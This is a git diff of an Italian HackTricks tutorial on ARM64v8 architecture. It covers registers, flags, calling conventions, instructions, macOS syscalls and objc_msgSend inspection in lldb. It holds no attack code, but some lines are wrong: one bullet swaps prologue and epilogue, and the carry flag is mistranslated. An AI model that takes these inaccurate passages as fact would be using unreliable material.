@@ -1,18 +1,19 @@
 # Introduzione ad ARM64v8
 
+{% hint style="success" %}
+Impara e pratica l'Hacking su AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Impara e pratica l'Hacking su GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Impara l'hacking su AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Sostieni HackTricks</summary>
 
-Altri modi per supportare HackTricks:
-
-* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
-* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
-* Scopri [**La Famiglia PEASS**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
-* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos di github.
+* Controlla i [**piani di abbonamento**](https://github.com/sponsors/carlospolop)!
+* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Condividi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
 
 ## **Livelli di Eccezione - EL (ARM64v8)**
 
@@ -39,19 +40,19 @@ ARM64 ha **31 registri a scopo generale**, etichettati da `x0` a `x30`. Ciascuno
 
 1. **`x0`** a **`x7`** - Questi sono tipicamente utilizzati come registri temporanei e per passare parametri alle subroutine.
 * **`x0`** contiene anche i dati di ritorno di una funzione.
-2. **`x8`** - Nel kernel Linux, `x8` viene utilizzato come numero di chiamata di sistema per l'istruzione `svc`. **In macOS viene utilizzato il x16!**
+2. **`x8`** - Nel kernel Linux, `x8` viene utilizzato come numero di chiamata di sistema per l'istruzione `svc`. **In macOS viene utilizzato x16!**
 3. **`x9`** a **`x15`** - Altri registri temporanei, spesso utilizzati per variabili locali.
-4. **`x16`** e **`x17`** - **Registri di Chiamata Intra-procedurale**. Registri temporanei per valori immediati. Vengono utilizzati anche per chiamate a funzioni indirette e per gli stub PLT (Procedure Linkage Table).
+4. **`x16`** e **`x17`** - **Registri di Chiamata Intra-procedurale**. Registri temporanei per valori immediati. Vengono utilizzati anche per chiamate a funzioni indirette e per stub PLT (Procedure Linkage Table).
 * **`x16`** viene utilizzato come **numero di chiamata di sistema** per l'istruzione **`svc`** in **macOS**.
-5. **`x18`** - **Registro di Piattaforma**. Può essere utilizzato come registro a scopo generale, ma su alcune piattaforme questo registro è riservato per usi specifici della piattaforma: Puntatore al blocco dell'ambiente del thread corrente in Windows, o per puntare alla struttura del compito attualmente **in esecuzione nel kernel Linux**.
+5. **`x18`** - **Registro di Piattaforma**. Può essere utilizzato come registro a scopo generale, ma su alcune piattaforme questo registro è riservato per usi specifici della piattaforma: Puntatore al blocco dell'ambiente del thread corrente in Windows, o per puntare alla struttura del task attualmente **in esecuzione nel kernel Linux**.
 6. **`x19`** a **`x28`** - Questi sono registri salvati dal chiamante. Una funzione deve preservare i valori di questi registri per il chiamante, quindi vengono memorizzati nello stack e ripristinati prima di tornare al chiamante.
-7. **`x29`** - **Registro del Frame** per tenere traccia del frame dello stack. Quando viene creato un nuovo frame dello stack perché viene chiamata una funzione, il registro **`x29`** viene **memorizzato nello stack** e l'indirizzo del **nuovo** frame pointer (indirizzo **`sp`**) viene **memorizzato in questo registro**.
+7. **`x29`** - **Puntatore al Frame** per tenere traccia del frame dello stack. Quando viene creato un nuovo frame dello stack perché viene chiamata una funzione, il registro **`x29`** viene **memorizzato nello stack** e l'indirizzo del **nuovo** frame pointer (indirizzo **`sp`**) viene **memorizzato in questo registro**.
 * Questo registro può anche essere utilizzato come **registro a scopo generale** anche se di solito viene utilizzato come riferimento per le **variabili locali**.
-8. **`x30`** o **`lr`**- **Registro di Link**. Contiene l'**indirizzo di ritorno** quando viene eseguita un'istruzione `BL` (Branch with Link) o `BLR` (Branch with Link to Register) memorizzando il valore di **`pc`** in questo registro.
+8. **`x30`** o **`lr`** - **Registro di Link**. Contiene l'**indirizzo di ritorno** quando viene eseguita un'istruzione `BL` (Branch with Link) o `BLR` (Branch with Link to Register) memorizzando il valore di **`pc`** in questo registro.
 * Può essere utilizzato come qualsiasi altro registro.
-* Se la funzione corrente sta per chiamare una nuova funzione e quindi sovrascrivere `lr`, lo memorizzerà nello stack all'inizio, questo è l'epilogo (`stp x29, x30 , [sp, #-48]; mov x29, sp` -> Memorizza `fp` e `lr`, genera spazio e ottieni nuovo `fp`) e lo recupererà alla fine, questo è il prologo (`ldp x29, x30, [sp], #48; ret` -> Recupera `fp` e `lr` e ritorna).
+* Se la funzione corrente sta per chiamare una nuova funzione e quindi sovrascrivere `lr`, lo memorizzerà nello stack all'inizio, questo è l'epilogo (`stp x29, x30 , [sp, #-48]; mov x29, sp` -> Memorizza `fp` e `lr`, genera spazio e ottiene il nuovo `fp`) e lo recupererà alla fine, questo è il prologo (`ldp x29, x30, [sp], #48; ret` -> Recupera `fp` e `lr` e ritorna).
 9. **`sp`** - **Puntatore dello Stack**, utilizzato per tenere traccia della cima dello stack.
-* il valore di **`sp`** dovrebbe sempre essere mantenuto almeno a un **allineamento di quadword** o potrebbe verificarsi un'eccezione di allineamento.
+* il valore di **`sp`** dovrebbe sempre essere mantenuto almeno a un **allineamento di quadre parole** o potrebbe verificarsi un'eccezione di allineamento.
 10. **`pc`** - **Contatore di Programma**, che punta alla prossima istruzione. Questo registro può essere aggiornato solo attraverso generazioni di eccezioni, ritorni di eccezioni e branch. Le uniche istruzioni ordinarie che possono leggere questo registro sono le istruzioni di branch con link (BL, BLR) per memorizzare l'indirizzo di **`pc`** in **`lr`** (Registro di Link).
 11. **`xzr`** - **Registro Zero**. Chiamato anche **`wzr`** nella sua forma a registro **32**-bit. Può essere utilizzato per ottenere facilmente il valore zero (operazione comune) o per eseguire confronti usando **`subs`** come **`subs XZR, Xn, #10`** memorizzando i dati risultanti da nessuna parte (in **`xzr`**).
 
@@ -59,7 +60,7 @@ I registri **`Wn`** sono la versione a **32 bit** del registro **`Xn`**.
 
 ### Registri SIMD e in Virgola Mobile
 
-Inoltre, ci sono altri **32 registri di lunghezza 128 bit** che possono essere utilizzati in operazioni ottimizzate di singola istruzione su dati multipli (SIMD) e per eseguire operazioni aritmetiche in virgola mobile. Questi sono chiamati registri Vn anche se possono operare in **64**-bit, **32**-bit, **16**-bit e **8**-bit e quindi sono chiamati **`Qn`**, **`Dn`**, **`Sn`**, **`Hn`** e **`Bn`**.
+Inoltre, ci sono altri **32 registri di lunghezza 128 bit** che possono essere utilizzati in operazioni ottimizzate di dati multipli con una singola istruzione (SIMD) e per eseguire operazioni aritmetiche in virgola mobile. Questi sono chiamati registri Vn anche se possono operare anche in **64**-bit, **32**-bit, **16**-bit e **8**-bit e quindi sono chiamati **`Qn`**, **`Dn`**, **`Sn`**, **`Hn`** e **`Bn`**.
 ### Registri di sistema
 
 **Ci sono centinaia di registri di sistema**, chiamati anche registri a scopo speciale (SPR), utilizzati per **monitorare** e **controllare** il **comportamento dei processori**.\
@@ -73,38 +74,38 @@ Sono spesso utilizzati per memorizzare l'**indirizzo di base della regione di me
 
 ### **PSTATE**
 
-**PSTATE** contiene diversi componenti del processo serializzati nel registro speciale **`SPSR_ELx`**, essendo X il **livello di permesso dell'eccezione** scatenata (questo consente di ripristinare lo stato del processo quando l'eccezione termina).\
+**PSTATE** contiene diversi componenti del processo serializzati nel registro speciale **`SPSR_ELx`**, essendo X il **livello di permesso dell'eccezione scatenata** (ciò consente di ripristinare lo stato del processo al termine dell'eccezione).\
 Questi sono i campi accessibili:
 
 <figure><img src="../../../.gitbook/assets/image (1196).png" alt=""><figcaption></figcaption></figure>
 
 * I flag di condizione **`N`**, **`Z`**, **`C`** e **`V`**:
-* **`N`** significa che l'operazione ha prodotto un risultato negativo
-* **`Z`** significa che l'operazione ha prodotto zero
-* **`C`** significa che l'operazione è stata eseguita
-* **`V`** significa che l'operazione ha prodotto un overflow con segno:
+* **`N`** indica che l'operazione ha prodotto un risultato negativo
+* **`Z`** indica che l'operazione ha prodotto zero
+* **`C`** indica che l'operazione è stata eseguita
+* **`V`** indica che l'operazione ha prodotto un overflow con segno:
 * La somma di due numeri positivi produce un risultato negativo.
 * La somma di due numeri negativi produce un risultato positivo.
-* Nella sottrazione, quando un grande numero negativo viene sottratto da un numero positivo più piccolo (o viceversa), e il risultato non può essere rappresentato all'interno dell'intervallo della dimensione del bit fornita.
-* Ovviamente il processore non sa se l'operazione è con segno o meno, quindi controllerà C e V nelle operazioni e indicherà se si è verificato un trasporto nel caso fosse con segno o senza.
+* Nella sottrazione, quando un numero negativo grande viene sottratto da un numero positivo più piccolo (o viceversa), e il risultato non può essere rappresentato all'interno dell'intervallo della dimensione dei bit fornita.
+* Ovviamente il processore non sa se l'operazione è con segno o meno, quindi controllerà C e V nelle operazioni e indicherà se si è verificato un trasporto nel caso fosse con segno o senza segno.
 
 {% hint style="warning" %}
 Non tutte le istruzioni aggiornano questi flag. Alcune come **`CMP`** o **`TST`** lo fanno, e altre che hanno un suffisso s come **`ADDS`** lo fanno anche.
 {% endhint %}
 
-* Il flag di larghezza del registro corrente (`nRW`): Se il flag ha il valore 0, il programma verrà eseguito nello stato di esecuzione AArch64 una volta ripreso.
+* Il flag attuale della **larghezza del registro (`nRW`)**: Se il flag ha il valore 0, il programma verrà eseguito nello stato di esecuzione AArch64 una volta ripreso.
 * Il **livello di eccezione corrente** (**`EL`**): Un programma regolare in esecuzione in EL0 avrà il valore 0
-* Il flag di **singolo passaggio** (**`SS`**): Usato dai debugger per passare singolarmente impostando il flag SS a 1 all'interno di **`SPSR_ELx`** attraverso un'eccezione. Il programma eseguirà un passaggio e emetterà un'eccezione di passaggio singolo.
-* Il flag di stato di eccezione illegale (**`IL`**): Viene utilizzato per contrassegnare quando un software privilegiato esegue un trasferimento di livello di eccezione non valido, questo flag viene impostato su 1 e il processore scatena un'eccezione di stato illegale.
+* Il flag di **singolo passaggio** (**`SS`**): Usato dai debugger per eseguire un passo alla volta impostando il flag SS su 1 all'interno di **`SPSR_ELx`** tramite un'eccezione. Il programma eseguirà un passo e emetterà un'eccezione di passo singolo.
+* Il flag di stato di eccezione illegale (**`IL`**): Viene utilizzato per segnalare quando un software privilegiato esegue un trasferimento di livello di eccezione non valido, questo flag viene impostato su 1 e il processore scatena un'eccezione di stato illegale.
 * I flag **`DAIF`**: Questi flag consentono a un programma privilegiato di mascherare selettivamente determinate eccezioni esterne.
-* Se **`A`** è 1 significa che verranno scatenati **aborti asincroni**. **`I`** configura la risposta alle **Richieste di Interruzione Hardware** esterne (IRQ) e F è relativo alle **Richieste di Interruzione Rapida** (FIR).
+* Se **`A`** è 1 significa che verranno scatenati **aborti asincroni**. **`I`** configura la risposta alle **Richieste di Interruzione Hardware** esterne (IRQs). e F è relativo alle **Richieste di Interruzione Rapida** (FIRs).
 * I flag di selezione del puntatore dello stack (**`SPS`**): I programmi privilegiati in esecuzione in EL1 e superiori possono passare dall'utilizzare il proprio registro del puntatore dello stack e quello del modello utente (ad es. tra `SP_EL1` e `EL0`). Questo passaggio viene eseguito scrivendo nel registro speciale **`SPSel`**. Questo non può essere fatto da EL0.
 
 ## **Convenzione di chiamata (ARM64v8)**
 
-La convenzione di chiamata ARM64 specifica che i **primi otto parametri** di una funzione vengono passati nei registri **`x0` attraverso `x7`**. I **parametri aggiuntivi** vengono passati nello **stack**. Il valore di **ritorno** viene restituito nel registro **`x0`**, o anche in **`x1`** se è lungo 128 bit. I registri **`x19`** a **`x30`** e **`sp`** devono essere **preservati** attraverso le chiamate di funzione.
+La convenzione di chiamata ARM64 specifica che i **primi otto parametri** di una funzione vengono passati nei registri **`x0` attraverso `x7`**. I **parametri aggiuntivi** vengono passati nello **stack**. Il valore di **ritorno** viene restituito nel registro **`x0`**, o anche in **`x1`** se è lungo 128 bit. I registri **`x19`** a **`x30`** e **`sp`** devono essere **preservati** durante le chiamate alle funzioni.
 
-Quando si legge una funzione in assembly, cercare il **prologo e l'epilogo della funzione**. Il **prologo** di solito coinvolge il **salvataggio del frame pointer (`x29`)**, **impostare** un **nuovo frame pointer** e **allocare spazio nello stack**. L'**epilogo** di solito coinvolge il **ripristino del frame pointer salvato** e il **ritorno** dalla funzione.
+Quando si legge una funzione in assembly, cercare il **prologo e l'epilogo** della funzione. Il **prologo** di solito coinvolge il **salvataggio del frame pointer (`x29`)**, **impostare** un **nuovo frame pointer**, e **allocare spazio nello stack**. L'**epilogo** di solito coinvolge il **ripristino del frame pointer salvato** e il **ritorno** dalla funzione.
 
 ### Convenzione di chiamata in Swift
 
@@ -112,13 +113,13 @@ Swift ha la sua **convenzione di chiamata** che può essere trovata in [**https:
 
 ## **Istruzioni Comuni (ARM64v8)**
 
-Le istruzioni ARM64 generalmente hanno il **formato `opcode dst, src1, src2`**, dove **`opcode`** è l'**operazione** da eseguire (come `add`, `sub`, `mov`, ecc.), **`dst`** è il **registro di destinazione** dove verrà memorizzato il risultato, e **`src1`** e **`src2`** sono i **registri di origine**. Possono essere utilizzati anche valori immediati al posto dei registri di origine.
+Le istruzioni ARM64 generalmente hanno il **formato `opcode dst, src1, src2`**, dove **`opcode`** è l'**operazione** da eseguire (come `add`, `sub`, `mov`, ecc.), **`dst`** è il registro **destinazione** dove verrà memorizzato il risultato, e **`src1`** e **`src2`** sono i registri **origine**. Possono essere utilizzati anche valori immediati al posto dei registri di origine.
 
 * **`mov`**: **Sposta** un valore da un **registro** a un altro.
 * Esempio: `mov x0, x1` — Questo sposta il valore da `x1` a `x0`.
 * **`ldr`**: **Carica** un valore dalla **memoria** in un **registro**.
 * Esempio: `ldr x0, [x1]` — Questo carica un valore dalla posizione di memoria puntata da `x1` in `x0`.
-* **Modalità di offset**: Un offset che influenza il puntatore di origine è indicato, ad esempio:
+* **Modalità di offset**: Un offset che influisce sul puntatore di origine è indicato, ad esempio:
 * `ldr x2, [x1, #8]`, questo caricherà in x2 il valore da x1 + 8
 * `ldr x2, [x0, x1, lsl #2]`, questo caricherà in x2 un oggetto dall'array x0, dalla posizione x1 (indice) \* 4
 * **Modalità pre-indicizzata**: Questo applicherà calcoli all'origine, otterrà il risultato e memorizzerà anche la nuova origine nell'origine.
@@ -131,10 +132,10 @@ Le istruzioni ARM64 generalmente hanno il **formato `opcode dst, src1, src2`**, 
 * **`str`**: **Memorizza** un valore da un **registro** nella **memoria**.
 * Esempio: `str x0, [x1]` — Questo memorizza il valore in `x0` nella posizione di memoria puntata da `x1`.
 * **`ldp`**: **Carica Coppia di Registri**. Questa istruzione **carica due registri** da **posizioni di memoria** consecutive. L'indirizzo di memoria è tipicamente formato aggiungendo un offset al valore in un altro registro.
-* Esempio: `ldp x0, x1, [x2]` — Questo carica `x0` e `x1` dalle posizioni di memoria a `x2` e `x2 + 8`, rispettivamente.
+* Esempio: `ldp x0, x1, [x2]` — Questo carica `x0` e `x1` dalle posizioni di memoria in `x2` e `x2 + 8`, rispettivamente.
 * **`stp`**: **Memorizza Coppia di Registri**. Questa istruzione **memorizza due registri** in **posizioni di memoria** consecutive. L'indirizzo di memoria è tipicamente formato aggiungendo un offset al valore in un altro registro.
-* Esempio: `stp x0, x1, [sp]` — Questo memorizza `x0` e `x1` nelle posizioni di memoria a `sp` e `sp + 8`, rispettivamente.
-* `stp x0, x1, [sp, #16]!` — Questo memorizza `x0` e `x1` nelle posizioni di memoria a `sp+16` e `sp + 24`, rispettivamente, e aggiorna `sp` con `sp+16`.
+* Esempio: `stp x0, x1, [sp]` — Questo memorizza `x0` e `x1` nelle posizioni di memoria in `sp` e `sp + 8`, rispettivamente.
+* `stp x0, x1, [sp, #16]!` — Questo memorizza `x0` e `x1` nelle posizioni di memoria in `sp+16` e `sp + 24`, rispettivamente, e aggiorna `sp` con `sp+16`.
 * **`add`**: **Aggiunge** i valori di due registri e memorizza il risultato in un registro.
 * Sintassi: add(s) Xn1, Xn2, Xn3 | #imm, \[shift #N | RRX]
 * Xn1 -> Destinazione
@@ -158,11 +159,11 @@ Le istruzioni ARM64 generalmente hanno il **formato `opcode dst, src1, src2`**, 
 * **Shift aritmetico a destra**: Come **`lsr`**, ma invece di aggiungere 0 se il bit più significativo è 1, \*\*aggiunge 1 (\*\*divide n volte per 2 in firmato)
 * **Ruota a destra**: Come **`lsr`** ma qualsiasi cosa venga rimossa da destra viene aggiunta a sinistra
 * **Ruota a destra con estensione**: Come **`ror`**, ma con il flag di carry come "bit più significativo". Quindi il flag di carry viene spostato al bit 31 e il bit rimosso al flag di carry.
-* **`bfm`**: **Spostamento di bit di campo**, queste operazioni **copiano i bit `0...n`** da un valore e li collocano nelle posizioni **`m..m+n`**. Il **`#s`** specifica la **posizione del bit più a sinistra** e **`#r`** la **quantità di rotazione a destra**.
-* Spostamento di bit di campo: `BFM Xd, Xn, #r`
-* Spostamento di bit di campo firmato: `SBFM Xd, Xn, #r, #s`
-* Spostamento di bit di campo non firmato: `UBFM Xd, Xn, #r, #s`
-* **Estrai e inserisci bitfield:** Copia un bitfield da un registro e lo copia in un altro registro.
+* **`bfm`**: **Bit Filed Move**, queste operazioni **copiano i bit `0...n`** da un valore e li collocano nelle posizioni **`m..m+n`**. Il **`#s`** specifica la **posizione del bit più a sinistra** e **`#r`** la **quantità di rotazione a destra**.
+* Spostamento del campo bit: `BFM Xd, Xn, #r`
+* Spostamento del campo bit firmato: `SBFM Xd, Xn, #r, #s`
+* Spostamento del campo bit non firmato: `UBFM Xd, Xn, #r, #s`
+* **Estrai e inserisci campo bit:** Copia un campo bit da un registro e lo copia in un altro registro.
 * **`BFI X1, X2, #3, #4`** Inserisce 4 bit da X2 dal 3° bit di X1
 * **`BFXIL X1, X2, #3, #4`** Estrae dal 3° bit di X2 quattro bit e li copia in X1
 * **`SBFIZ X1, X2, #3, #4`** Estende il segno di 4 bit da X2 e li inserisce in X1 a partire dalla posizione del bit 3 azzerando i bit a destra
@@ -180,7 +181,7 @@ Le istruzioni ARM64 generalmente hanno il **formato `opcode dst, src1, src2`**, 
 * Supporta la **stessa sintassi di `subs`**
 * Esempio: `cmp x0, x1` — Questo confronta i valori in `x0` e `x1` e imposta i flag di condizione di conseguenza.
 * **`cmn`**: **Confronto negativo** dell'operando. In questo caso è un **alias di `adds`** e supporta la stessa sintassi. Utile per sapere se `m == -n`.
-* **`ccmp`**: Confronto condizionale, è un confronto che verrà eseguito solo se un confronto precedente è stato vero e imposterà specificamente i bit nzcv.
+* **`ccmp`**: Confronto condizionale, è un confronto che verrà eseguito solo se un confronto precedente è vero e imposterà specificamente i bit nzcv.
 * `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> se x1 != x2 e x3 < x4, salta a func
 * Questo perché **`ccmp`** verrà eseguito solo se il **precedente `cmp` era un `NE`**, se non lo fosse i bit `nzcv` verranno impostati a 0 (che non soddisferà il confronto `blt`).
 * Questo può anche essere usato come `ccmn` (stesso ma negativo, come `cmp` vs `cmn`).
@@ -222,11 +223,11 @@ Le istruzioni ARM64 generalmente hanno il **formato `opcode dst, src1, src2`**, 
 * `csetm Xd, Xn, Xm, cond` -> Se vero, Xd = \<tutti 1>, se falso, Xd = 0
 * **`adrp`**: Calcola l'**indirizzo di pagina di un simbolo** e lo memorizza in un registro.
 * Esempio: `adrp x0, symbol` — Questo calcola l'indirizzo di pagina di `symbol` e lo memorizza in `x0`.
-* **`ldrsw`**: **Carica** un valore firmato **di 32 bit** dalla memoria e **estendilo a 64 bit**.
-* Esempio: `ldrsw x0, [x1]` — Questo carica un valore firmato di 32 bit dalla posizione di memoria puntata da `x1`, lo estende a 64 bit e lo memorizza in `x0`.
+* **`ldrsw`**: **Carica** un valore firmato **a 32 bit** dalla memoria e **estende il segno a 64** bit.
+* Esempio: `ldrsw x0, [x1]` — Questo carica un valore firmato a 32 bit dalla posizione di memoria puntata da `x1`, estende il segno a 64 bit e lo memorizza in `x0`.
 * **`stur`**: **Memorizza un valore di registro in una posizione di memoria**, utilizzando un offset da un altro registro.
 * Esempio: `stur x0, [x1, #4]` — Questo memorizza il valore in `x0` nella posizione di memoria che è 4 byte maggiore rispetto all'indirizzo attualmente in `x1`.
-* **`svc`** : Effettua una **chiamata di sistema**. Sta per "Supervisor Call". Quando il processore esegue questa istruzione, **passa dalla modalità utente alla modalità kernel** e salta a una posizione specifica in memoria dove si trova il codice di gestione delle chiamate di sistema del **kernel**.
+* **`svc`** : Effettua una **chiamata di sistema**. Sta per "Supervisor Call". Quando il processore esegue questa istruzione, **passa dalla modalità utente alla modalità kernel** e salta a una posizione specifica in memoria dove si trova il codice di gestione delle **chiamate di sistema del kernel**.
 *   Esempio:
 
 ```armasm
@@ -246,12 +247,12 @@ stp x29, x30, [sp, #-16]!  ; store pair x29 and x30 to the stack and decrement t
 {% endcode %}
 
 2. **Imposta il nuovo frame pointer**: `mov x29, sp` (imposta il nuovo frame pointer per la funzione corrente)
-3. **Allocare spazio nello stack per le variabili locali** (se necessario): `sub sp, sp, <size>` (dove `<size>` è il numero di byte necessari)
+3. **Allocare spazio nello stack per le variabili locali** (se necessario): `sub sp, sp, <size>` (dove `<size>` è il numero di byte necessario)
 
 ### **Epilogo della Funzione**
 
 1. **Dealloca le variabili locali (se ne sono state allocate)**: `add sp, sp, <size>`
-2. **Ripristina il link register e il frame pointer**:
+2. **Ripristina il registro del link e il frame pointer**:
 
 {% code overflow="wrap" %}
 ```armasm
@@ -264,7 +265,7 @@ ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment th
 ## Stato di esecuzione AARCH32
 
 Armv8-A supporta l'esecuzione di programmi a 32 bit. **AArch32** può funzionare in uno dei **due set di istruzioni**: **`A32`** e **`T32`** e può passare da uno all'altro tramite **`interworking`**.\
-I programmi **privilegiati** a 64 bit possono pianificare l'**esecuzione di programmi a 32 bit** eseguendo un trasferimento di livello di eccezione al 32 bit meno privilegiato.\
+I programmi **privilegiati** a 64 bit possono pianificare l'**esecuzione di programmi a 32 bit** eseguendo un trasferimento di livello di eccezione al 32 bit a livello di privilegio inferiore.\
 Si noti che la transizione da 64 bit a 32 bit avviene con un abbassamento del livello di eccezione (ad esempio un programma a 64 bit in EL1 che attiva un programma in EL0). Ciò viene fatto impostando il **bit 4 di** **`SPSR_ELx`** registro speciale **a 1** quando il thread del processo `AArch32` è pronto per essere eseguito e il resto di `SPSR_ELx` memorizza i programmi **`AArch32`** CPSR. Quindi, il processo privilegiato chiama l'istruzione **`ERET`** in modo che il processore passi a **`AArch32`** entrando in A32 o T32 a seconda di CPSR\*\*.\*\*
 
 L'**`interworking`** avviene utilizzando i bit J e T di CPSR. `J=0` e `T=0` significa **`A32`** e `J=0` e `T=1` significa **T32**. Questo si traduce fondamentalmente nell'impostare il **bit più basso a 1** per indicare che il set di istruzioni è T32.\
@@ -308,7 +309,7 @@ I campi sono divisi in alcuni gruppi:
 #### Application Program Status Register (APSR)
 
 - I flag **`N`**, **`Z`**, **`C`**, **`V`** (come in AArch64)
-- Il flag **`Q`**: Viene impostato a 1 ogni volta che si verifica una **saturazione intera** durante l'esecuzione di un'istruzione aritmetica di saturazione specializzata. Una volta impostato a **`1`**, manterrà il valore fino a quando non verrà impostato manualmente a 0. Inoltre, non c'è alcuna istruzione che ne controlla il valore implicitamente, deve essere fatto leggendolo manualmente.
+- Il flag **`Q`**: Viene impostato a 1 ogni volta che si verifica una **saturazione intera** durante l'esecuzione di un'istruzione aritmetica di saturazione specializzata. Una volta impostato a **`1`**, manterrà il valore fino a quando non verrà impostato manualmente a 0. Inoltre, non c'è alcuna istruzione che controlla il suo valore implicitamente, deve essere fatto leggendolo manualmente.
 - **`GE`** (Greater than or equal) Flags: Viene utilizzato nelle operazioni SIMD (Single Instruction, Multiple Data), come "addizione parallela" e "sottrazione parallela". Queste operazioni consentono di elaborare più punti dati in un'unica istruzione.
 
 Ad esempio, l'istruzione **`UADD8`** **aggiunge quattro coppie di byte** (da due operandi da 32 bit) in parallelo e memorizza i risultati in un registro da 32 bit. Quindi **imposta i flag `GE` nell'`APSR`** in base a questi risultati. Ciascun flag GE corrisponde a una delle addizioni di byte, indicando se l'addizione per quella coppia di byte ha **overflowed**.
@@ -317,14 +318,14 @@ L'istruzione **`SEL`** utilizza questi flag GE per eseguire azioni condizionali.
 
 #### Execution State Registers
 
-- I bit **`J`** e **`T`**: **`J`** dovrebbe essere 0 e se **`T`** è 0 viene utilizzato il set di istruzioni A32, e se è 1, viene utilizzato il set di istruzioni T32.
+- I bit **`J`** e **`T`**: **`J`** dovrebbe essere 0 e se **`T`** è 0 viene utilizzato il set di istruzioni A32, e se è 1 viene utilizzato il set di istruzioni T32.
 - **IT Block State Register** (`ITSTATE`): Questi sono i bit da 10 a 15 e da 25 a 26. Memorizzano le condizioni per le istruzioni all'interno di un gruppo con prefisso **`IT`**.
 - Bit **`E`**: Indica la **endianness**.
 - **Mode and Exception Mask Bits** (0-4): Determinano lo stato di esecuzione corrente. Il quinto indica se il programma viene eseguito come 32 bit (un 1) o 64 bit (un 0). Gli altri 4 rappresentano la **modalità di eccezione attualmente in uso** (quando si verifica un'eccezione e viene gestita). Il numero impostato **indica la priorità corrente** nel caso in cui venga scatenata un'altra eccezione mentre questa viene gestita.
 
 <figure><img src="../../../.gitbook/assets/image (1200).png" alt=""><figcaption></figcaption></figure>
 
-- **`AIF`**: Alcune eccezioni possono essere disabilitate utilizzando i bit **`A`**, `I`, `F`. Se **`A`** è 1 significa che verranno scatenati **aborti asincroni**. Il **`I`** configura la risposta alle **Richieste di Interruzione Hardware** esterne (IRQ). e il F è relativo alle **Richieste di Interruzione Rapida** (FIR).
+- **`AIF`**: Alcune eccezioni possono essere disabilitate utilizzando i bit **`A`**, `I`, `F`. Se **`A`** è 1 significa che verranno scatenati **aborti asincroni**. Il **`I`** configura la risposta alle **Richieste di Interruzione Hardware** esterne (IRQ). e il F è relativo alle **Richieste di Interruzione Rapida** (FIRs).
 
 ## macOS
 
@@ -349,7 +350,7 @@ dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shar
 {% endcode %}
 
 {% hint style="success" %}
-A volte è più facile controllare il codice **decompilato** da **`libsystem_kernel.dylib`** piuttosto che controllare il **codice sorgente** perché il codice di diverse chiamate di sistema (BSD e Mach) è generato tramite script (controlla i commenti nel codice sorgente) mentre nella dylib puoi trovare cosa viene chiamato.
+A volte è più facile controllare il codice **decompilato** da **`libsystem_kernel.dylib`** **piuttosto che** controllare il **codice sorgente** perché il codice di diverse chiamate di sistema (BSD e Mach) è generato tramite script (controlla i commenti nel codice sorgente) mentre nella dylib puoi trovare cosa viene chiamato.
 {% endhint %}
 
 ### chiamate machdep
@@ -366,14 +367,15 @@ Ad esempio, la chiamata `gettimeofdate` legge il valore di `timeval` direttament
 
 È molto comune trovare questa funzione utilizzata nei programmi Objective-C o Swift. Questa funzione consente di chiamare un metodo di un oggetto Objective-C.
 
-Parametri ([ulteriori informazioni nella documentazione](https://developer.apple.com/documentation/objectivec/1456712-objc\_msgsend)):
+Parametri ([più informazioni nella documentazione](https://developer.apple.com/documentation/objectivec/1456712-objc\_msgsend)):
 
 * x0: self -> Puntatore all'istanza
 * x1: op -> Selettore del metodo
 * x2... -> Resto degli argomenti del metodo invocato
 
 Quindi, se imposti un breakpoint prima del salto a questa funzione, puoi facilmente trovare cosa viene invocato in lldb con (in questo esempio l'oggetto chiama un oggetto da `NSConcreteTask` che eseguirà un comando):
-```
+```bash
+# Right in the line were objc_msgSend will be called
 (lldb) po $x0
 <NSConcreteTask: 0x1052308e0>
 
@@ -390,8 +392,28 @@ whoami
 )
 ```
 {% hint style="success" %}
-Impostando la variabile di ambiente `NSObjCMessageLoggingEnabled=1` è possibile registrare quando questa funzione viene chiamata in un file come `/tmp/msgSends-pid`.
+Impostando la variabile di ambiente **`NSObjCMessageLoggingEnabled=1`** è possibile registrare quando questa funzione viene chiamata in un file come `/tmp/msgSends-pid`.
+
+Inoltre, impostando **`OBJC_HELP=1`** e chiamando qualsiasi binario è possibile visualizzare altre variabili di ambiente che potresti utilizzare per **registrare** quando avvengono determinate azioni Objc-C.
 {% endhint %}
+
+Quando questa funzione viene chiamata, è necessario trovare il metodo chiamato dell'istanza indicata, per questo vengono effettuate ricerche diverse:
+
+* Eseguire una ricerca nella cache ottimistica:
+* Se ha successo, finito
+* Acquisire runtimeLock (lettura)
+* Se (realize && !cls->realized) realizzi la classe
+* Se (initialize && !cls->initialized) inizializza la classe
+* Prova la cache della classe stessa:
+* Se ha successo, finito
+* Prova l'elenco dei metodi della classe:
+* Se trovato, riempi la cache e finito
+* Prova la cache della superclasse:
+* Se ha successo, finito
